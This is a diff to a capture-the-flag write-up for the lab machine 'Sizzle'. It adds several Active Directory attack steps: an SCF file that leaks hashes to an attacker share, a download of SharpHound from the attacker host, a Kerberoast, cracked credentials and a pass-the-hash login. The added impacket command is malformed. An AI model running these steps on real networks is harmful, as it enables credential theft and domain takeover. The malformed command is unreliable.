@@ -1,7 +1,7 @@
 # Sizzle
 
 This is the write-up for the box Sizzle that got retired at the 1st June 2019.
-My IP address was 10.10.14.6 while I did this.
+My IP address was 10.10.14.22 while I did this.
 
 Let's put this in our hosts file:
 ```markdown
@@ -188,7 +188,7 @@ smbclient -N '//10.10.10.103/Department Shares'
 
 ![Folders in the share](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_smb-shares.png)
 
-There are so many folders of different departments that I will mount this share locally:
+There are many folders of different departments so I will mount this share locally for easy browsing:
 ```markdown
 mount -t cifs -o vers=1.0 '//10.10.10.103/Department Shares' /mnt/smb
 ```
@@ -232,12 +232,12 @@ The file I created is called _steal.scf_ and has this contents:
 ```markdown
 [Shell]
 Command=2
-IconFile=\\10.10.14.6\share\stealhash.ico
+IconFile=\\10.10.14.22\share\stealhash.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
 
-Start **Responder** and then upload that file to **\Users\Public\**:
+Start **Responder** and then upload that file to **C:\Users\Public**:
 ```markdown
 responder -I tun0
 ```
@@ -360,7 +360,7 @@ Running the script gives us a shell on the box as user _htb\amanda_!
 Since we know that this is a domain controller and we have a session now, we should run **Bloodhound** to gather information about the domain. First we need to upload the ingestor **SharpHound.exe** onto the box and then we can execute it:
 
 ```markdown
-IWR -Uri http://10.10.14.6/SharpHound.exe -OutFile SharpHound.exe
+IWR -Uri http://10.10.14.22/SharpHound.exe -OutFile SharpHound.exe
 ```
 
 When trying to run it we see that a policy is blocking it so we need to [bypass AppLocker](https://github.com/api0cradle/UltimateAppLockerByPassList) by executing it in a directory that is whitelisted by default like _C:\Windows\Temp_ for example.
@@ -416,11 +416,11 @@ And now we can download the generated ZIP file and analyze it with BloodHound.
 
 Looking at the query **Find Principals with DCSync Rights** we get information about the users that can do a **DCSync Attack**.
 
-The user _Mrkly_ has the _GetChangesAll_ and _GetChanges_ permission and these two are needed to do DS-Replication-Get-Changes to perform a DCSync attack:
+The user _Mrlky_ has the _GetChangesAll_ and _GetChanges_ permission and these two are needed to do DS-Replication-Get-Changes to perform a DCSync attack:
 
 ![Bloodhound DCSync rights](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_bh_1.png)
 
-If we look at the **Shortest Paths from Kerberoastable Users** we see that the user _Mrkly_ can do this, too:
+If we look at the **Shortest Paths from Kerberoastable Users** we see that the user _Mrlky_ can do this, too:
 
 ![Bloodhound Kerberoastable rights](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_bh_2.png)
 
@@ -433,17 +433,17 @@ So lets do a **Kerberoast** attack from Covenant. First we create a token so the
 
 ![Covenant Rubeus Kerberoast](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-kerberoast.png)
 
-And we get a TGS ticket for the user _Mrkly_:
+And we get a TGS ticket for the user _Mrlky_:
 ```markdown
 $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$00EEDBE52D6CEFE97F3C75A89F3CAB73$779AF 6953FFC7F37CCE7A7247DDE3039336F59C99D8C763A4C1B1DA1D3AFFE71DC6CBF90171C811C58280 DA2CF72B54F293CE846E1EE2AF120B16A0BBBDD25F2D4A2781D9C97AF071F9FDFFA07DA2D48908D7 89CBCF5C883765347EAE76C09BB576B138C08DEBBFCBFAB84D1E8D4C5E68DE6C69EF41894F170B2F 095C664339655C34FE2C1487884602137974A0E239412504D5A4FC6217D0DE247422AD3AA6719A12 BABD90CA963807DBF6C797ABBBC1C3028085EAA0D2D66E0F1261079D8FAA873513108485CA66C5D0 CAA247E57FBCA400D97FCE6CF86C78C719EA639D8A81EFC1ED31CEF083B49EB9E1F6A48FC61A0B4C 1586A4E657F31D0061BA44F166173DBDDF01A7411CC61AF8025153EE6D5D348A9E0DA746F3827C9B 8C1E7A1FD328834EE794C31F0B8072E69F75A958B3B323632773C2B6B6FAA529D2909B4648018139 14C06F42B71626E55A01FA5376B1B3CF4E2C828285B582D9A568D340B8436610F0D4D3C6F9D42F25 DDBBA4D6E21729C87427D2DFB4F9AB31E68ED1947A01F4CE19C7C4659E39EA6301B67399EE76E785 322DFB7025DCE49F2B9CFEBC5D881A357030656F07E37B26628369293A9AB7BA3B9F4BA7BCB612D1 83FD4D98EACC32220AB2DADB665272BE52CD6BE56E302BA1888A7A9761DFE82BE40ED05B87966820 5E0F2A6CBB3C9B38A3E053715EB09F4111A01BA81105E51A0D782FB700013BDAB704C3136FD22C91 BBE6CAD72A8D0B29E5D7F4724303D0EECD311BE8C43DC97D7FC46D18410676807FF5F66419118119 2592AE0ACE56ABDBCAAADC109240FC5F09CB485C238FE0B80539CFA19D45127EE3759D8962BE93A9 169904A28212AFBFA61C0AB542468A9141BDDD801EC1673C43288755BB5B7E099C756E22DB884B82 96AB163EF076CD32C3F34C7BED21DD48DE33E717EFAB0DC1AACFD8B1A781148656DF7177EC480F3E 08D1D17E0DAC1F802867288149B385BF6B04BA5202280143233D339B12599A9E2A4CF94D194CBF38 7BB7362C0D080806B2F4455C287C8041B72DFBB70A477014F03A6C56A63981E2A391C5FB3AB030DE 27C968D92AE8871789CD8CBD88A1D32C96976A5EDB16D7F5D4070AE2BA4ED335398AACFEA7D0C104 C6681CFAB943665A4B48AB6813E636347FA13EAB81D774605D5F5F6C05BBDDAC3604DEC967A9E9BB F80C8F3BA45462DA0395144DB20ABD98627F4436B6531EA3ECAA0ADC16AB4D8132FB773627A3EE6C DAAFD240C466F341F45046A6CFE0C5F274D5667496913EDA352652C802DF55B032957B97D35D8754 CA2B8A27BA498D0189F4199DD6E9DB7D9B1AAA76283966D8968F034952F98C499BB5EFED0808F6D3 4D84231C92078E0E8FCA3DD26D5381B86475944B7A4C64B8DEBDD6B8401F223 
 ```
 
 Cracking it with Hashcat:
 ```markdown
-hashcat -m 13100 mrkly.tgs /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 mrlky.tgs /usr/share/wordlists/rockyou.txt
 ```
 
-We have the password of Mrkly:
+We have the password of Mrlky:
 > Football#7
 
 Now we do the DCSync attack with this user. First we create a token in Covenant for authentication and then the DCSync module on the user _Administrator_:
@@ -452,4 +452,12 @@ Now we do the DCSync attack with this user. First we create a token in Covenant 
 
 ![Covenant DCSync](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-dcsync.png)
 
+The NTLM hash of Administrator is:
+> f6b7160bfc91823792e0ac3a162c9267
 
+With that we can log in with _impacket-wmiexec_ from the **Impacket framework** into the box:
+```markdown
+impacket-wmiexec psexec.py Administrator@10.10.10.103 -hashes f6b7160bfc91823792e0ac3a162c9267:f6b7160bfc91823792e0ac3a162c9267
+```
+
+This starts a shell on the box as the user Administrator on the box and we can read the flags!
